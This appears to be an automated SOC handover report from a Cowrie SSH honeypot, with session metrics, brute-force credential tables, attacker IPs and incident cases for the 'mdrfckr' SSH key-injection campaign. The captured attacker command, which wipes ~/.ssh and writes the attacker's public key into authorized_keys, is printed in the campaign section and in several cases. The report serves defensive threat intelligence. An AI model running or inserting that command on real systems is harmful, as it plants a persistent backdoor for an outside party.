# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-12 |
| **Generated At** | 2026-04-12T05:53:27Z |
| **Shift Time** | 05:53 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **148** |
| Confirmed Threats | **145** |
| False Positives Filtered | **3** (2.0%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **11** |
| High Severity Cases | **48** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **100** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **116** |
| Unique Credential Pairs | **67** |
| Unique Usernames | **32** |
| Unique Passwords | **65** |
| Successful Auth Pairs | **31** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 48 |
| `345gs5662d34` | 24 |
| `ubuntu` | 4 |
| `ftpuser` | 4 |
| `teamspeak` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 24 |
| `ray` | 2 |
| `1234` | 2 |
| `123456789` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 24 |
| `ray` | `ray` | 2 |
| `teamspeak` | `123456789` | 2 |
| `sara` | `sara` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456Qw!` | `69.149.23.135` | 2026-04-12T02:23:16 |
| `root` | `3245gs5662d34` | `69.149.23.135` | 2026-04-12T02:23:22 |
| `root` | `Qazwsx1111` | `154.204.183.232` | 2026-04-12T02:25:14 |
| `root` | `3245gs5662d34` | `154.204.183.232` | 2026-04-12T02:25:27 |
| `root` | `Root123456789!` | `69.149.23.135` | 2026-04-12T02:26:12 |
| `root` | `0990` | `90.25.145.86` | 2026-04-12T02:27:32 |
| `root` | `3245gs5662d34` | `90.25.145.86` | 2026-04-12T02:27:38 |
| `root` | `Root111111#` | `90.25.145.86` | 2026-04-12T02:29:10 |
| `root` | `Gp123456` | `154.204.183.232` | 2026-04-12T02:32:41 |
| `root` | `1qaz2wsx3edc@@` | `210.79.191.199` | 2026-04-12T02:33:39 |
| `root` | `3245gs5662d34` | `210.79.191.199` | 2026-04-12T02:33:44 |
| `root` | `Root0000` | `210.79.191.199` | 2026-04-12T02:38:46 |
| `root` | `Super123` | `210.79.191.199` | 2026-04-12T02:40:40 |
| `root` | `1234!@#$qwerQWER` | `210.79.191.199` | 2026-04-12T02:42:22 |
| `root` | `Root001!` | `210.79.191.199` | 2026-04-12T02:45:52 |
| `root` | `superman` | `154.204.183.232` | 2026-04-12T02:48:46 |
| `root` | `abcd123.` | `154.204.183.232` | 2026-04-12T02:56:12 |
| `root` | `ubuntu123456` | `210.79.191.199` | 2026-04-12T02:56:40 |
| `root` | `135792468` | `154.204.183.232` | 2026-04-12T03:00:06 |
| `root` | `Qwerty@1` | `210.79.191.199` | 2026-04-12T03:00:16 |
| `root` | `qwerty@12` | `210.79.191.199` | 2026-04-12T03:02:10 |
| `root` | `Admin88888888` | `154.204.183.232` | 2026-04-12T03:08:00 |
| `root` | `qazwsxedc123` | `154.204.183.232` | 2026-04-12T03:15:52 |
| `root` | `abcdefgh` | `154.204.183.232` | 2026-04-12T03:28:18 |
| `root` | `Admin12345678@@` | `197.153.57.103` | 2026-04-12T05:49:42 |
| `root` | `3245gs5662d34` | `197.153.57.103` | 2026-04-12T05:49:47 |
| `root` | `a1234567@` | `20.153.204.5` | 2026-04-12T05:50:52 |
| `root` | `3245gs5662d34` | `20.153.204.5` | 2026-04-12T05:50:56 |
| `root` | `frappe` | `102.140.97.134` | 2026-04-12T05:51:18 |
| `root` | `3245gs5662d34` | `102.140.97.134` | 2026-04-12T05:51:25 |
| `root` | `Cyber@123` | `197.153.57.103` | 2026-04-12T05:51:44 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **148** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 142 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 115 | 12 |
| `f555226df196...` | Mirai/variant | 25 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 115 | 12 | Modern SSH client |
| `f555226df196...` | libssh | 25 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 2 | 2 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `20.153.204.5`, `102.140.97.134`, `90.25.145.86`, `197.153.57.103`, `69.149.23.135`, `210.79.191.199`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **16** |
| High-Risk ASNs | **14** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS3215` | Orange S.A. | 1 | HIGH |
| `AS30988` | IS InternetSolutions Limited | 1 | HIGH |
| `AS8069` | Microsoft Corporation | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS29447` | Scaleway SAS | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (48)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d6e7c35e4b6e

| Field | Detail |
|---|---|
| **Source IP** | `69.149.23[.]135` |
| **First Seen** | 2026-04-12 02:23 |
| **Last Seen** | 2026-04-12 02:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:23:16` | `cowrie.login.success` |
| `2026-04-12 02:23:16` | `cowrie.session.params` |
| `2026-04-12 02:23:16` | `cowrie.command.input` |
| `2026-04-12 02:23:16` | `cowrie.command.failed` |
| `2026-04-12 02:23:17` | `cowrie.log.closed` |
| `2026-04-12 02:23:17` | `cowrie.session.params` |
| `2026-04-12 02:23:17` | `cowrie.command.input` |
| `2026-04-12 02:23:18` | `cowrie.session.file_download` |
| `2026-04-12 02:23:18` | `cowrie.log.closed` |
| `2026-04-12 02:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.149.23[.]135` to AbuseIPDB if not already reported
- [ ] Block `69.149.23[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46f5dfb6cc02

| Field | Detail |
|---|---|
| **Source IP** | `69.149.23[.]135` |
| **First Seen** | 2026-04-12 02:23 |
| **Last Seen** | 2026-04-12 02:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:23:21` | `cowrie.session.connect` |
| `2026-04-12 02:23:21` | `cowrie.client.version` |
| `2026-04-12 02:23:21` | `cowrie.client.kex` |
| `2026-04-12 02:23:22` | `cowrie.login.success` |
| `2026-04-12 02:23:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.149.23[.]135` to AbuseIPDB if not already reported
- [ ] Block `69.149.23[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1553119a6d98

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:25 |
| **Last Seen** | 2026-04-12 02:25 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:25:10` | `cowrie.session.connect` |
| `2026-04-12 02:25:10` | `cowrie.client.version` |
| `2026-04-12 02:25:11` | `cowrie.client.kex` |
| `2026-04-12 02:25:14` | `cowrie.login.success` |
| `2026-04-12 02:25:16` | `cowrie.session.params` |
| `2026-04-12 02:25:16` | `cowrie.command.input` |
| `2026-04-12 02:25:16` | `cowrie.command.failed` |
| `2026-04-12 02:25:17` | `cowrie.log.closed` |
| `2026-04-12 02:25:18` | `cowrie.session.params` |
| `2026-04-12 02:25:18` | `cowrie.command.input` |
| `2026-04-12 02:25:19` | `cowrie.session.file_download` |
| `2026-04-12 02:25:19` | `cowrie.log.closed` |
| `2026-04-12 02:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44110ae847e7

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:25 |
| **Last Seen** | 2026-04-12 02:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:25:24` | `cowrie.session.connect` |
| `2026-04-12 02:25:24` | `cowrie.client.version` |
| `2026-04-12 02:25:25` | `cowrie.client.kex` |
| `2026-04-12 02:25:27` | `cowrie.login.success` |
| `2026-04-12 02:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11b3ec695000

| Field | Detail |
|---|---|
| **Source IP** | `69.149.23[.]135` |
| **First Seen** | 2026-04-12 02:26 |
| **Last Seen** | 2026-04-12 02:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:26:11` | `cowrie.session.connect` |
| `2026-04-12 02:26:11` | `cowrie.client.version` |
| `2026-04-12 02:26:11` | `cowrie.client.kex` |
| `2026-04-12 02:26:12` | `cowrie.login.success` |
| `2026-04-12 02:26:13` | `cowrie.session.params` |
| `2026-04-12 02:26:13` | `cowrie.command.input` |
| `2026-04-12 02:26:13` | `cowrie.command.failed` |
| `2026-04-12 02:26:13` | `cowrie.log.closed` |
| `2026-04-12 02:26:13` | `cowrie.session.params` |
| `2026-04-12 02:26:13` | `cowrie.command.input` |
| `2026-04-12 02:26:14` | `cowrie.session.file_download` |
| `2026-04-12 02:26:14` | `cowrie.log.closed` |
| `2026-04-12 02:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.149.23[.]135` to AbuseIPDB if not already reported
- [ ] Block `69.149.23[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-160a0689ecf6

| Field | Detail |
|---|---|
| **Source IP** | `69.149.23[.]135` |
| **First Seen** | 2026-04-12 02:26 |
| **Last Seen** | 2026-04-12 02:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:26:17` | `cowrie.session.connect` |
| `2026-04-12 02:26:17` | `cowrie.client.version` |
| `2026-04-12 02:26:17` | `cowrie.client.kex` |
| `2026-04-12 02:26:18` | `cowrie.login.success` |
| `2026-04-12 02:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.149.23[.]135` to AbuseIPDB if not already reported
- [ ] Block `69.149.23[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9df420abf698

| Field | Detail |
|---|---|
| **Source IP** | `90.25.145[.]86` |
| **First Seen** | 2026-04-12 02:27 |
| **Last Seen** | 2026-04-12 02:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:27:31` | `cowrie.session.connect` |
| `2026-04-12 02:27:31` | `cowrie.client.version` |
| `2026-04-12 02:27:31` | `cowrie.client.kex` |
| `2026-04-12 02:27:32` | `cowrie.login.success` |
| `2026-04-12 02:27:32` | `cowrie.session.params` |
| `2026-04-12 02:27:32` | `cowrie.command.input` |
| `2026-04-12 02:27:32` | `cowrie.command.failed` |
| `2026-04-12 02:27:33` | `cowrie.log.closed` |
| `2026-04-12 02:27:33` | `cowrie.session.params` |
| `2026-04-12 02:27:33` | `cowrie.command.input` |
| `2026-04-12 02:27:33` | `cowrie.session.file_download` |
| `2026-04-12 02:27:33` | `cowrie.log.closed` |
| `2026-04-12 02:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.25.145[.]86` to AbuseIPDB if not already reported
- [ ] Block `90.25.145[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-972d5b0b3bb5

| Field | Detail |
|---|---|
| **Source IP** | `90.25.145[.]86` |
| **First Seen** | 2026-04-12 02:27 |
| **Last Seen** | 2026-04-12 02:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:27:37` | `cowrie.session.connect` |
| `2026-04-12 02:27:37` | `cowrie.client.version` |
| `2026-04-12 02:27:37` | `cowrie.client.kex` |
| `2026-04-12 02:27:38` | `cowrie.login.success` |
| `2026-04-12 02:27:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.25.145[.]86` to AbuseIPDB if not already reported
- [ ] Block `90.25.145[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c356887efc70

| Field | Detail |
|---|---|
| **Source IP** | `90.25.145[.]86` |
| **First Seen** | 2026-04-12 02:29 |
| **Last Seen** | 2026-04-12 02:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:29:09` | `cowrie.session.connect` |
| `2026-04-12 02:29:09` | `cowrie.client.version` |
| `2026-04-12 02:29:09` | `cowrie.client.kex` |
| `2026-04-12 02:29:10` | `cowrie.login.success` |
| `2026-04-12 02:29:11` | `cowrie.session.params` |
| `2026-04-12 02:29:11` | `cowrie.command.input` |
| `2026-04-12 02:29:11` | `cowrie.command.failed` |
| `2026-04-12 02:29:11` | `cowrie.log.closed` |
| `2026-04-12 02:29:12` | `cowrie.session.params` |
| `2026-04-12 02:29:12` | `cowrie.command.input` |
| `2026-04-12 02:29:12` | `cowrie.session.file_download` |
| `2026-04-12 02:29:12` | `cowrie.log.closed` |
| `2026-04-12 02:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.25.145[.]86` to AbuseIPDB if not already reported
- [ ] Block `90.25.145[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a75318332127

| Field | Detail |
|---|---|
| **Source IP** | `90.25.145[.]86` |
| **First Seen** | 2026-04-12 02:29 |
| **Last Seen** | 2026-04-12 02:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:29:16` | `cowrie.session.connect` |
| `2026-04-12 02:29:16` | `cowrie.client.version` |
| `2026-04-12 02:29:16` | `cowrie.client.kex` |
| `2026-04-12 02:29:17` | `cowrie.login.success` |
| `2026-04-12 02:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.25.145[.]86` to AbuseIPDB if not already reported
- [ ] Block `90.25.145[.]86` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24a787b76c42

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:32 |
| **Last Seen** | 2026-04-12 02:32 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:32:37` | `cowrie.session.connect` |
| `2026-04-12 02:32:38` | `cowrie.client.version` |
| `2026-04-12 02:32:38` | `cowrie.client.kex` |
| `2026-04-12 02:32:41` | `cowrie.login.success` |
| `2026-04-12 02:32:42` | `cowrie.session.params` |
| `2026-04-12 02:32:42` | `cowrie.command.input` |
| `2026-04-12 02:32:42` | `cowrie.command.failed` |
| `2026-04-12 02:32:42` | `cowrie.log.closed` |
| `2026-04-12 02:32:43` | `cowrie.session.params` |
| `2026-04-12 02:32:43` | `cowrie.command.input` |
| `2026-04-12 02:32:44` | `cowrie.session.file_download` |
| `2026-04-12 02:32:44` | `cowrie.log.closed` |
| `2026-04-12 02:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef20551c143

| Field | Detail |
|---|---|
| **Source IP** | `154.204.183[.]232` |
| **First Seen** | 2026-04-12 02:32 |
| **Last Seen** | 2026-04-12 02:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 02:32:51` | `cowrie.session.connect` |
| `2026-04-12 02:32:51` | `cowrie.client.version` |
| `2026-04-12 02:32:52` | `cowrie.client.kex` |
| `2026-04-12 02:32:53` | `cowrie.login.success` |
| `2026-04-12 02:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.204.183[.]232` to AbuseIPDB if not already reported
- [ ] Block `154.204.183[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5929d0f30fd

| Field | Detail |
|---|---|
| **Source IP** | `210.79.191[.]199` |
| **First Seen** | 2026-04-12 02:33 |
| **Last Seen** | 2026-04-12 02:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
